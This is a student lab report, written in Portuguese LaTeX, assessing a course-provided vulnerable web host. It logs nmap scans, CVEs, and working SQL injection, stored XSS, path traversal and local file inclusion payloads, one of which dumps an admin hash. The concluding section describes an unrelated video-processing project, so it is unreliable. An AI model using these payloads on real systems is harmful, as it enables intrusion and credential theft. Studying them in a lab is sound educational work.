@@ -1,0 +1,471 @@
+\documentclass[10pt]{article}
+
+\usepackage{fourier}
+
+\usepackage[]{graphicx}
+\usepackage[]{color}
+\usepackage{xcolor}
+\usepackage{alltt}
+\usepackage{listings}
+\usepackage[T1]{fontenc}
+\usepackage[utf8]{inputenc}
+\setlength{\parskip}{\smallskipamount}
+\setlength{\parindent}{5ex}
+\usepackage{indentfirst}
+\usepackage{listings}
+\usepackage{setspace}
+\usepackage{hyperref}
+
+\definecolor{blue(munsell)}{rgb}{0.0, 0.5, 0.69}
+\hypersetup{
+    colorlinks=true,
+    linkcolor=blue,
+    filecolor=magenta,      
+    urlcolor=blue, urlsize=2em
+}
+
+% Set page margins
+\usepackage[top=100pt,bottom=100pt,left=68pt,right=66pt]{geometry}
+
+% Package used for placeholder text
+\usepackage{lipsum}
+
+% Prevents LaTeX from filling out a page to the bottom
+\raggedbottom
+
+
+\usepackage{fancyhdr}
+\fancyhf{} 
+\fancyfoot[C]{\thepage}
+\renewcommand{\headrulewidth}{0pt} 
+\pagestyle{fancy}
+
+\usepackage{titlesec}
+\titleformat{\chapter}
+   {\normalfont\LARGE\bfseries}{\thechapter.}{1em}{}
+\titlespacing{\chapter}{0pt}{50pt}{2\baselineskip}
+
+\usepackage{float}
+\floatstyle{plaintop}
+\restylefloat{table}
+
+\usepackage[tableposition=top]{caption}
+
+
+
+\frontmatter
+
+\definecolor{light-gray}{gray}{0.95}
+
+\renewcommand{\contentsname}{Índice}
+
+\begin{document}
+
+\begin{titlepage}
+	\clearpage\thispagestyle{empty}
+	\centering
+	\vspace{2cm}
+	{\Large\underline{Segurança Informática e Nas Organizações} \par}
+	\vspace{0.5cm}
+	{\small João Paulo Barraca\par Vitor Cunha  \par}
+	\vspace{4cm}
+	{\LARGE \textbf{Vulnerability Assessment and Exploitation}} \\ \vspace{0.5cm}
+	\vspace{5cm}
+	{\normalsize Carolina Araújo, 93248\\Orlando Macedo 94521 \par}
+	\vspace{2cm}
+    \includegraphics[scale=0.20]{logo_ua.png}
+    \vspace{2cm}
+	{\normalsize \\DETI \\Universidade de Aveiro \par}
+	{\normalsize 16-11-2020 \par}
+	\vspace{2cm}
+	\pagebreak
+\end{titlepage}
+\tableofcontents
+\newpage
+
+\section{Introdução}
+\par Este trabalho visa a aprendizagem de conceitos relacionados com a avaliação de possíveis vulnerabilidades no host fornecido, os seus riscos e o impacto que podem ter num sistema, quando exploradas por um potencial \textit{attacker}. Exemplos destas vulnerabilidades, \href{https://cve.mitre.org/}{CVE's}, são validações mal realizadas, más autorizações, configurações mal feitas, práticas errôneas, inclusão perigosa de ficheiros, programas não seguros, entre outras.
+\par Apresentar-se-á, então, o que foi realizado em prol da realização deste trabalho, explicando não só as escolhas que foram feitas e como, mas também o porquê das mesmas.
+
+\subsubsection{Utilização do nmap}
+\subsubsection{Utilização do sqlmap}
+\subsubsection{Utilização do nikto2}
+\subsubsection{Utilização do dirb}
+
+\section{Tasks}
+\subsection{Communication Ports}
+\par Nesta secção pretende-se responder à pergunta sobre quais são os \textit{communication ports} disponíveis e qual a funcionalidade de cada um deles.
+
+\par Inicialmente, correu-se um rastreio dos \textit{hosts} e um \textit{scan} TCP no endereço especificado. Com base nos resultados, Figura 1, concluiu-se que a porta 22/tcp está aberta para o serviço \textit{\textbf{ssh}}, na versão OpenSSH 8.3p1 Debian 1 (protocol 2.0). Para além disso, a porta 80/tcp está, também ela, aberta mas para o serviço \textit{\textbf{http}}, na versão Apache httpd 2.4.46 ((Debian)).
+\par É também possível confirmar que o sistema operativo usado pelo host pertence à família Linux.
+    \begin{figure}[!h]
+        \centering
+        \includegraphics[width=0.7\textwidth]{NMAP/ssh_sV.png}
+        \caption{nmap -sV scan} 
+    \end{figure}
+
+\par Tentou-se, de seguida, descobrir qual a distribuição do sistema operativo do host, embora não se tenha chegado a resultados conclusivos. Com base na documentação do \href{https://nmap.org/book/osdetect-unidentified.html}{nmap}, detetaram-se características que pareciam apontar para um OS em específico mas ainda assim, não foi capaz de encontrar uma correspondência exata. A fingerprint identifica unicamente a máquina remota, contendo informação a partir da qual se pode, possivelmente, inferir o OS. 
+    \begin{figure}[!h]
+        \centering
+        \includegraphics[width=0.7\textwidth]{NMAP/nmap_-sV_-0.png}
+        \caption{nmap -sV -O scan} 
+    \end{figure}
+
+\par Posteriormente, para uma pesquisa mais completa, correu-se o seguinte comando, para testar portas que o nmap não testa por defeito, entre estas: TCP SYN/ACK ou UDP, bem como ICMP echo, timestamp e netmask request (\href{https://nmap.org/man/pt_PT/man-briefoptions.html}{source}). Pelos resultados obtidos, foi possível aferir que a porta 68/udp está também aberta, mas filtrada, com o serviço dhcpc (não foi obtida informação sobre a versão usada). O nmap define as portas como \href{https://nmap.org/book/man-port-scanning-basics.html}{open/filtered} quando não consegue definir se a porta está aberta ou se é filtrada. Uma porta filtered é aquela cujos pacotes enviados para a mesma não permitem obter uma resposta, pode ser devido a uma firewall ou configuração do router, etc. 
+    \begin{figure}[!h]
+        \centering
+        \includegraphics[width=0.7\textwidth]{NMAP/ssh_sU.png}
+        \caption{nmap -PS -PA -PU -PY -PE -PP -PM -sU scan} 
+    \end{figure}
+    
+\par Finalmente, por causa da informação descoberta acerca da porta ssh, se se descobrisse o username e a password correspondente do host, poderia utilizar-se do seguinte modo, sendo que neste caso se estava a tentar aceder ao admin: 
+    \begin{figure}[!h]
+        \centering
+        \includegraphics[width=0.7\textwidth]{ssh.jpeg}
+        \caption{Tentativa de acesso remoto} 
+    \end{figure}
+
+\subsubsection{HTTP} 
+\par \href{https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol}{\textbf{Hypertext Transfer Protocol}} é um protocolo de comunicação para sistemas de informação hipermédia. É a base da comunicação de dados para a World Wide Web. 
+\subsubsection{SSH}
+\par \href{https://en.wikipedia.org/wiki/SSH_(Secure_Shell)}{\textbf{Secure Socket Shell}} é um protocolo de rede criptográfico para operar de forma segura numa rede insegura. Um exemplo de aplicação deste protocolo é o acesso remoto a sistemas de computadores, a partir do qual se pode, por exemplo, executar comandos. 
+\subsubsection{UDP}
+\par \href{https://en.wikipedia.org/wiki/User_Datagram_Protocol}{\textbf{User Datagram Protocol}} é um protocolo da camada de transporte. Permite que as aplicaçãos enviem datagramas encapsulados num pacote IPv4 ou IPv6 a um destino. Usando um modelo de connectionless communication, o UDP não confirma a entrega dos pacotes enviados.
+
+    
+\subsection{Host}
+\par \hypertarget{host}{Aquando} da utilização do \href{https://tools.kali.org/web-applications/dirb}{dirb}, para explorar o url por ficheiros, pastas ou problemas de configuração, obtiveram-se os seguintes resultados:
+    \begin{figure}[!h]
+        \centering
+        \includegraphics[width=0.7\textwidth]{dirb.jpeg}
+        \caption{Utilização do dirb} 
+    \end{figure}
+\par Ao percorrer todos estes urls, encontraram-se vários dados que mais à frente serão debatidos, sendo a mais importante delas, para este ponto, a do <ip>/info.php, uma vez que, seguindo este url, temos acesso a um leque de informações relativas à \href{https://www.php.net/manual/en/function.phpinfo.php}{configuração do php}. Entre elas, encontram-se as informações relativas ao sistema do host: \textbf{inux cyberdyne 5.9.0-1-amd64 #1 SMP Debian 5.9.1-1 (2020-10-17) x86\_64}. Para além disso, afere-se também a versão do PHP utilizada: \textbf{5.6.40-35+ubuntu18.04.1+deb.sury.org+1} , (...)
+
+\par Com o objetivo de descobrir qual o sistema operativo e quais os serviços disponíveis, bem como as suas versões e funcionalidades, ... (tmb se a informação encontrada é coerente)
+
+\subsection{CVE's}
+\subsubsection{CVE's encontrados utilizando 'nmap --script nmap-vulners -sV <url>'}
+\begin{itemize}
+    \item \href{https://vulners.com/cve/CVE-2020-15778}{CVE-2020-15778} com score de 6.8
+    \par Esta vulnerabilidade está relacionada com o facto do comando scp de OpenSSH-8.3p1 permitir a injeção de comandos na função scp.c toremote.
+    \begin{figure}[!h]
+        \centering
+        \includegraphics[width=0.7\textwidth]{CVE/vulners_cve.png}
+        \caption{nmap-vulners} 
+    \end{figure}
+\end{itemize}
+    
+
+\subsubsection{CVE's encontrados utilizando 'nmap --script vulscan -sV <url>'}
+\begin{itemize}
+    \item \href{https://www.cvedetails.com/cve/CVE-1999-0661/?q=CVE-1999-0661}{CVE-1999-0661} com score de 10
+    \par CVE relativo ao facto do software ter sido substituido num dos pontos de distribuição por um Trojan Horse
+    \item \href{https://www.cvedetails.com/cve/CVE-2013-2249/?q=CVE-2013-2249}{CVE-2013-2249} com score de 7.5
+    \par \text{CVE que expõe a vulnerabilidade de em mod\_session\_dbd.c no módulo mod\_session\_dbd do Apache HTTP Server antes de 2.4.5 proceder a operações de salvamento sem ter em consideração a 'dirty flag' e o requisito para uma nova sessão, o qual tem impacto incerto e permite vetores de ataque remoto.}
+    
+    \begin{figure}[!h]
+        \centering
+        \includegraphics[width=0.7\textwidth]{CVE/ssh_cve.png}
+        \caption{CVE's encontrados na porta 22/tcp} 
+    \end{figure}
+    
+    \item \href{https://www.cvedetails.com/cve/CVE-2012-2379/?q=CVE-2012-2379}{CVE-2012-2379} com score de 10
+    \par CVE relativo ao Apache CXF 2.4.x antes de 2.4.8, 2.5.x antes de 2.5.4 e 2.6.x antes de 2.6.1, quando um token de suporte especifica uma política filho WS-SecurityPolicy 1.1 ou 1.2, não assegura com certeza que um elemento xml é assinado ou encriptado, o que tem impacto e vetores de ataque distintos.
+    \item \href{https://www.cvedetails.com/cve/CVE-2012-0883/?q=CVE-2012-0883}{CVE-2012-0883} com score de 6.9
+    \par \text{CVE associado ao envvars no Apache HTTP Server antes de 2.4.2 coloca um diretório com comprimento nulo em LD\_LIBRARY\_PATH, o que permite que utilizadores comuns ganhem previlégios de super-utilizador, usando um Trojan Horse DSO no diretório atual aquando a execução de apachectl.}
+    
+    \begin{figure}[!h]
+        \centering
+        \includegraphics[width=0.7\textwidth]{CVE/http_cve.png}
+        \caption{CVE's encontrados na porta 80/tcp}
+    \end{figure}
+
+\end{itemize}
+
+\subsection{Public Exploits}
+\par Estudar se os public exploits são capazes de validar a existencia de vulnerabilidades
+
+\subsection{Web Page e Exploração das Vulnerabilidades}
+\par Inicialmente, começou-se por percorrer todas as páginas do site, tomando especial atenção ao login, onde se tentaram injeções de sql básicas, tanto no e-mail como na password, sem chegar a nenhuma conclusão. Estas tentativas foram baseadas nos exemplos explorados na aula prática 1, portanto: 
+
+\par \textbf{e-mail: ' or '1'='1' -- }
+\par \textbf{password: abc}
+\newline
+\par \textbf{e-mail: ' or 1 -- }
+\par \textbf{password: abc}
+\newline
+\par \textbf{username: ' or '1'='1' -- // }
+\par \textbf{e-mail: abc}
+\newline
+
+\par No entanto, tudo falhou porque o primeiro campo requer a introdução de um e-mail válido. Tentou-se então sql injection de outra maneira, pesquisando sobre como introduzir algo nesse campo que o SQL aceitasse como e-mail, embora não o fosse:
+\par \textbf{e-mail: "'OR 1=1--"@gmail.com } (\href{https://stackoverflow.com/questions/2923594/valid-e-mail-addresses-xss-and-sql-injection}{source})
+\par \textbf{password: abc}
+\newline
+\par Novamente sem sucesso, sendo mais tarde explorado o porquê de não se ter conseguido, foi colocado regex no primeiro campo, tentando que correspondesse a um formato genérico de e-mail:
+\par \textbf{e-mail: [a-z0-9.-\_+]@[a-z0-9.-].com}
+\par \textbf{password: abc}
+\newline
+\par Não atingindo qualquer resultado palpável, continuou-se a explorar o site, onde se começou a descobrir pormenores mais curiosos: a partir do url das páginas Board e Software, notou-se uma possibilidade de conseguir fazer sql injection, uma vez que tinha \textbf{'?type=1'} ou \textbf{'?prod=3&type=1'}, por exemplo. 
+\par Assim sendo, começou-se a tentar realizar sql injection, novamente com base na aula prática 1. Sabia-se que havia pelo menos 5 colunas associadas a um produto: name, price, type, details e id. 
+\subsubsection{SQL Injection e XSS}
+\par \textbf{<ip>/details.php?<script>alert("eheh")</script>prod=3&type=3	}
+\par A primeira tentativa de injeção de script no url retomou a seguinte resposta: \textbf{"DB Error, could not query the database MySQL Error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' at line 1"}. A partir deste resultado tomou-se conhecimento de qual o SGBD utilizado para sustentar os dados do site, \textbf{MariaDB}. Considera-se que o retorno literal do erro da base de dados carrega bastante perigo, tornando o site mais desprotegido e vulnerável, visto que expõe facilmente informação que de outra maneira teria de se trabalhar muito mais para obter.
+\newline
+\newline
+\par \textbf{<ip>/products.php?type=1 union select 1,2,3,4,5 -- }
+\par Com este url notou-se que apareceu mais um produto no fim da listagem, cujo nome era 3. Com isto, suspeitou-se que a 3º coluna retornada pelos queries à base de dados era colocada no atributo \textbf{name} do produto. Assim, achou-se que a melhor forma de fazer sql injection nesta página seria a partir da 3º coluna, o que é explorado abaixo. Clicando no produto não se chegou a conclusão nenhuma.
+\newline\newline
+\par \textbf{<ip>/products.php?type=1 union select 1,2,3,4,5,6 -- }
+\par Este url já nos redireciona para a home, pelo que se concluiu que são só 5 colunas associadas a um produto.
+\newline\newline
+\par \textbf{<ip>/products.php?type=1 union select 1,database(),3,4,5 -- }
+\par Com isto apareceu mais um produto cujo nome era 3. Clicando nesse mesmo, e observando o url, apercebemo-nos de que o \textbf{type} correspondia a \textbf{oldstore}, o que se depreende (e mais tarde é confirmado) ser nome da base de dados.
+\newline\newline
+\par \textbf{<ip>/products.php?type=1 union select 1, TABLE\_NAME, COLUMN\_NAME, TABLE\_SCHEMA, 5 from INFORMATION\_SCHEMA.COLUMNS -- }
+\par Percorrendo a página inteira, encontraram-se no fundo os nomes de algumas tabelas que se pensou serem interessantes explorar, como por exemplo:
+\newline
+\par Verificar o nome de todos os produtos disponíveis:
+\par \textbf{<ip>/products.php?type=1 union select 1,2,COLUMN\_NAME,4,5 from INFORMATION\_SCHEMA.COLUMNS WHERE TABLE\_NAME="tblProducts"}
+
+\par Verificar todos os ids dos produtos existentes na base de dados:
+\par \textbf{<ip>/products.php?type=1 union select 1,2, id,4,5 from tblProducts -- }
+
+
+\newline
+\par Verificar os títulos dos blogs existentes na base de dados:
+\par \textbf{<ip>/products.php?type=1 union select 1,2, title,4,5 from tblBlogs --}
+
+
+\par Mas mais interessante, com base no nome das tabelas que se descobriram acima:
+\par \textbf{<ip>/products.php?type=2 union select 1, 2, id, 4, 5 from tblMembers}
+\par \textbf{<ip>/products.php?type=2 union select 1, 2, username, 4, 5 from tblMembers}
+\par \textbf{<ip>/products.php?type=2 union select 1, 2, password, 4, 5 from tblMembers}
+\par \textbf{<ip>/products.php?type=2 union select 1, 2, session, 4, 5 from tblMembers}
+\par \textbf{<ip>/products.php?type=2 union select 1, 2, name, 4, 5 from tblMembers}
+\par \textbf{<ip>/products.php?type=2 union select 1, 2, blog, 4, 5 from tblMembers}
+\par \textbf{<ip>/products.php?type=2 union select 1, 2, admin, 4, 5 from tblMembers}
+\newline
+\par Temos agora acesso ao e-mail do administrador, à sua password, sessão, nome, entre outros.
+\par Tabelas importantes: \textbf{tblBlogs} (author, title, content), \textbf{tblMembers} (id, username, password, session, name, blog, admin), \textbf{tblProducts} (id, type, name, price, detail).
+\newline\par Conteúdo da tabela tblMembers:
+\par \textbf{1      admin@integratingsolutions.net    Administrator     354403ec41ad649d1e5a9f108f0e5245        Admin   	1   	1}
+\par Nota: tinha-se já obtido o e-mail previamente através da página blogs, porque clicando em 'by Admin' era possível ver qual o e-mail associado ao mesmo. Sendo que, no caso concreto desta store, o e-mail é utilizado como parte das credenciais necessárias para o login, considera-se que disponibilizar publicamente os e-mails é de grande risco. Isto porque qualquer attacker, através de sql injection ou um método de brute force na password, pode obter acesso às contas. 
+\par O próximo passo foi atacar novamente o login, tentando injeção já com o e-mail:
+\par \textbf{e-mail: admin@integratingsolutions.net}
+\par \textbf{password: "' or 1 = 1 -- } 
+\newline
+\par Já na conta do admin, podendo postar novos blogs, testaram-se novas maneiras de fazer sql injection e xss:
+\par \textbf{<script>{console.log(“ola”)}</script> }
+\par Resultando numa mensagem na consola: GET http://192.168.1.7/ola
+\newline
+\par \textbf{<img src="https://shifter.sapo.pt/wp-content/uploads/2018/03/rickrolled.png">}
+\newline
+\par \textbf{<script>alert("eheh")</script>}
+\newline
+\par \textbf{<div><p>"something"</p></div>}
+\newline
+\newline
+\par \textbf{A título de exemplo, encontram-se abaixo 3 stored xss attacks}
+\begin{itemize}
+    \item \textbf{Em primeiro lugar tentamos colocar uma imagem no content}
+    \begin{figure}[!h]
+        \centering
+        \includegraphics[width=0.7\textwidth]{XSS/img.png}
+        \caption{código html de imagem no conteúdo}
+    \end{figure}
+    \textbf{Verificamos que era possível}
+    \begin{figure}[!h]
+        \centering
+        \includegraphics[width=0.7\textwidth]{XSS/imagem_prova.png}
+        \caption{imagem em conteúdo}
+    \end{figure}
+    
+    \item \textbf{De seguida, tentamos com um script}
+    \begin{figure}[!h]
+        \centering
+        \includegraphics[width=0.7\textwidth]{XSS/steal_cookie_post.png}
+        \caption{código html}
+    \end{figure}
+    \textbf{E, mais uma vez, obtivemos bons resultados. Desta feita, teríamos conseguido obter o 'SessionId' do administrador. Como se pode verificar em 'POST BODY'}
+    \begin{figure}[!h]
+        \centering
+        \includegraphics[width=0.7\textwidth]{XSS/steal_cookie_dump.png}
+        \caption{página preparada para receber pedidos post}
+    \end{figure}
+    
+    \item \textbf{Como último teste no campo de conteúdo, experimentamos colocar um form, mediante a informação encontrada neste \href{http://html5sec.org/}{link}. Tendo a experiência sido executada com sucesso.}
+    \begin{figure}[!h]
+        \centering
+        \includegraphics[width=0.7\textwidth]{XSS/form.png}
+        \caption{código html}
+    \end{figure}
+    \begin{figure}[!h]
+        \centering
+        \includegraphics[width=0.7\textwidth]{XSS/form_prova1.png}
+        \caption{form no conteúdo dum post}
+    \end{figure}
+    \begin{figure}[!h]
+        \centering
+        \includegraphics[width=0.7\textwidth]{XSS/form_prova2.png}
+        \caption{alert despoletado pelo form}
+    \end{figure}
+    
+    \item \textbf{Verificando que o campo 'content' estava vulnerável a ataques xss, passamos então para o campo de 'title'. Nesse campo começamos por verificar se daria para colocar '<img>'}
+    \begin{figure}[!h]
+        \centering
+        \includegraphics[width=0.7\textwidth]{XSS/imagem_title.png}
+        \caption{código html}
+    \end{figure}
+    \textbf{E como seria de esperar, a experiência foi bem sucedida.}
+    \begin{figure}[!h]
+        \centering
+        \includegraphics[width=0.7\textwidth]{XSS/imagem_prova_title.png}
+        \caption{ataque xss no título dum post}
+    \end{figure}
+    
+    \item \textbf{Para terminar, foi testada a possibilidade de '<script>'. Comprovando-se que também era possível.}
+    \begin{figure}[!h]
+        \centering
+        \includegraphics[width=0.7\textwidth]{XSS/script_title.png}
+        \caption{código html}
+    \end{figure}
+    \begin{figure}[!h]
+        \centering
+        \includegraphics[width=0.7\textwidth]{XSS/script_title_prova2.png}
+        \caption{javascript no título dum post}
+    \end{figure}
+    \begin{figure}[!h]
+        \centering
+        \includegraphics[width=0.7\textwidth]{XSS/script_title_prova1.png}
+        \caption{alert provocado pelo javascript em title}
+    \end{figure}
+\end{itemize}
+
+\newline
+\par Continuando com a exploração da página em si, dois pormenores suscitaram atenção:
+\begin{itemize}
+    \item Aquando na página dos termos e condições (que também contém o email do admin), seria de esperar que clicar quer em GBP, EUR ou USD no rodapé da página fizesse algo, o que não aconteceu. No entanto, o atributo \hypertarget{lang}{\textbf{lang}} aparecesse no url. Isto será explorado mais à frente. 
+    \item Querendo saber o que o portfolio fazia para iniciar o download, fizemos \textit{hover} sobre o mesmo e obtivemos o seguinte url: \textbf{<ip>/download.php?item=Brochure.pdf}. Explorado também mais à frente. 
+\end{itemize}
+
+\par Vendo como se processava o download do Brochure.pdf e tendo já acesso aos diretórios encontrados a partir do dirb, como explicado na seccção \hyperlink{host}{2.1}, testou-se o seguinte, visto que este ficheiro aparecia incluído no login.php: 
+\par \textbf{<ip>/download.php?item=connection.php}
+\par O que não resultou em nada... Mas não deu erro nem voltou à home page, apenas mostrou blank page, portanto podemos simplesmente estar a ir buscar ao diretório errado. Assim sendo, tentou-se \href{https://owasp.org/www-community/attacks/Path_Traversal}{directory traversal}:
+\par \textbf{<ip>/download.php?item=../connection.php}
+\par Obteve-se assim o primeiro de muitos ficheiros php. A partir da inclusão de código php, foi possível aprender sobre todos os outros que existiam e eram usados. Os seguintes são os que foram encontrados e que se conseguiram descarregar:
+\begin{itemize}
+    \item about.php
+    \item aboutcontent.php
+    \item account.php
+    \item blog.php
+    \item blog-content.php
+    \item config.php
+    \item connection.php
+    \item connectioni.php
+    \item display.php
+    \item footer.php
+    \item front.php
+    \item header.php
+    \item index.php
+    \item info.php
+    \item products.php 
+    \item user-details.php
+    \item download.php
+    \item getfile.php
+    \item login.php
+    \item logout.php
+    \item postblog.php
+    \item terms.php
+    \item updateaccount.php
+    \item admin.php
+    \item admincontent.php
+    \item adminheader.php
+    \item adminnav.php
+\end{itemize}
+\par Para além destes, embora não se consiga verificar a existência destes ficheiros, sabe-se que duas urls dependem dos ficheiros \textbf{delproduct.php} e \textbf{addproduct.php}. Estas seriam as páginas para adicionar e remover produtos, apenas acessíveis quando logged in como administrador. 
+\newline
+\subsubsection{Exploração dos Ficheiros PHP}
+\par Consideram-se os seguintes ficheiros php bastante importantes.
+
+    \begin{figure}[!h]
+        \centering
+        \includegraphics[width=0.7\textwidth]{PHP/connection.png}
+        \caption{connection.php}
+    \end{figure}
+    \begin{figure}[!h]
+        \centering
+        \includegraphics[width=0.7\textwidth]{PHP/config.png}
+        \caption{config.php}
+    \end{figure}
+\par A partir dos dois excertos acima incluídos, é revelado como se faz a conexão à base de dados e qual as credenciais necessárias para o fazer. 
+\newpage
+    \begin{figure}[!h]
+        \centering
+        \includegraphics[width=0.7\textwidth]{PHP/display.png}
+        \caption{display.php}
+    \end{figure}
+
+\par Algo bastante interessante que foi descoberto no ficheiro display.php foi o facto de a variável \hyperlink{lang}{\textbf{lang}} anteriormente mencionada, ser incluída na íntegra no meio do código. Caso não seja passado um valor para a variável lang pelo url, será utilizada a cookie dessa variável, indo buscar o último valor que lhe foi associado, sendo que o valor default é 'GBP'. 
+\par O include literal de uma variável que é passada no url é bastante perigoso porque abre possibilidades enormes de injeção de código php, abordadas mais à frente. 
+\par Para além do mais, é também aqui que se imprimem os erros resultantes de queries sql mal formulados, o que já se disse ser perigoso. 
+
+    \begin{figure}[!h]
+        \centering
+        \includegraphics[width=0.7\textwidth]{PHP/header.png}
+        \caption{header.php}
+    \end{figure}
+
+\par Novamente deveras curioso, neste trecho de código é possível ver que, caso o \href{https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Headers/User-Agent}{http user agent}, isto é, a sequência de carateres que permite a identificação do agente que está a realizar um pedido ao servidor, seja alguma das acima descritas, a execução do script termina. Isto impede que aqueles agentes acedam a parte da informação da store... embora tanto o sqlmap como o Nikto permitam mascarar esta propriedade. 
+\par De seguida, a cookie da varíavel lang é definida. 
+
+    \begin{figure}[!h]
+        \centering
+        \includegraphics[width=0.7\textwidth]{PHP/postblog.png}
+        \caption{postblog.php}
+    \end{figure}
+
+\par Já aqui, para postar um blog é necessário inserir o mesmo na respetiva tabela. Para isto, é usado o raw value do título e conteúdo, o que por si só é a vulnerabilidade que permite todo o tipo de sql injections e xss anteriormente descritas mas, ainda mais grave, é poder (potencialmente) permitir inserção CRUD operations indesejadas - como table ou database drops. \par \textbf{somethingsomething'); DROP TABLE mysql.time\_zone; --} é um exemplo daquilo que poderia ser inserido como conteúdo. No entanto, com base em pesquisa, o \href{https://www.php.net/manual/en/function.mysql-query.php}{PHP mysql\_query} permite apenas a realização de um único statement, ou seja, não dá para o mesmo query processar INSERT e DROP. Ainda assim, há um bypass que permitiria o mysql\_query receber mais do que um statement, caso se alterasse devidamente a conexão com a base de dados a partir de uma  \href{https://www.php.net/manual/en/mysql.constants.php#mysql.client-flags}{flag} (\textbf{CLIENT\_MULTI\_STATEMENTS 65536 /* Enable/disable multi-stmt support */}). Deste modo já seria possível executar dois statements num único query. Porém, como é possível ver pelo primeiro excerto apresentado, a conexão não está assim definida, pelo que é impossível realizar este tipo de operações aqui. A flag também só resultaria em versões do PHP acima de 4.3.0 e caso \textbf{sql.safe\_mode} != 1 no \textit{php.ihi}, retornando output apenas relativo ao primeiro statement. (\href{https://stackoverflow.com/questions/10663046/how-to-execute-multiple-mysql-queries-together-in-php/10663140}{source})
+
+\subsubsection{Root}
+\par Numa tentativa de ganhar acesso à root, uma das maneiras exploradas, devido ao include da varíavel lang acima discutido, foi a execução de comandos e scripts via php. Explorar-se-á a \href{https://www.netsparker.com/blog/web-security/local-file-inclusion-vulnerability/}{local file inclusion vulnerability}
+\par Esta abordagem foi fortemente explorada, embora não tenha dado os resultados esperados. 
+\par Com base no DOCUMENT\_ROOT e outras informações indicadas no ficheiro info.php, var/www/html, começou a tentar aceder-se a ficheiros que possivelmente lá estariam alojados (como logs).
+\newline
+\par \textbf{<ip>/products.php?type=1&lang=../../../../../../../../var/log/httpd/error\_log}
+\par \textbf{<ip>/products.php?type=1&lang=../../../../../../../../etc/timezone}
+\par \textbf{<ip>/products.php?type=1&lang=../../../../../../../../etc/httpd/logs/access\_log}
+\par \textbf{<ip>/products.php?type=1&lang=../../../../../../../../var/log/apache2/error\_log}
+\par \textbf{<ip>/products.php?type=1&lang=../../../../../../../../var/log/apache2/access\_log}
+\par \textbf{<ip>/products.php?type=1&lang=../../../../../../../../var/log/httpd/access\_log}
+\par \textbf{<ip>/products.php?type=1&lang=../../../../../../../../var/log/httpd/error\_log}
+\par \textbf{<ip>/products.php?type=1&lang=../../../../../../../../var/log/mysqld.log}
+\newline
+\par Dos acima mencionados apenas dois retornam resultados:
+    \begin{figure}[!h]
+        \centering
+        \includegraphics[width=0.7\textwidth]{PHP/sqllog.png}
+        \caption{postblog.php}
+    \end{figure}
+    \begin{figure}[!h]
+        \centering
+        \includegraphics[width=0.7\textwidth]{PHP/etctimezone.png}
+        \caption{postblog.php}
+    \end{figure}
+\par O que significa que, de facto, consegue-se aceder a ficheiros existentes no host. É, agora, necessário verificar se é possível adicionar um ficheiro à máquina.
+\par \textbf{}
+\section{Conclusão}
+\par De modo geral, considera-se que a solução criada cumpre todos os requisitos propostos e, até os ultrapassa em algumas situações, como no caso da utilização de um identificador \textit{MD5 Hash}. 
+\par Entre as dificuldades encontradas aquando da realização do projeto, está o facto de inicialmente se ter criado um cliente que dividia ele mesmo as \textit{frames}, enviando-as então para o servidor, em vez de um simples \textit{curl}. Isto ocorreu devido a um mal entendido sobre qual o propósito do servidor, tendo-se pensado que se o cliente fizesse a divisão em \textit{frames} dos vídeos, se aliviava carga do servidor, o que por sua vez acelerava o tratamento do vídeo. 
+\par Para além disso, inicialmente também foi morosa a pesquisa de quais as ferramentas que se pretendia utilizar, bem como definir a estratégia de comunicação, em prol de um processamento rápido que, ao mesmo tempo, permitisse uma boa gestão dos recursos. Julga-se que as ferramentas utilizadas são aptas para a o objetivo deste trabalho. 
+
+\section{Referências}
+    \bibliographystyle{plain}
+    
+    \bibliography{biblist}
+    [1] \url{https://nmap.org/}
+
+\end{document}
+
+
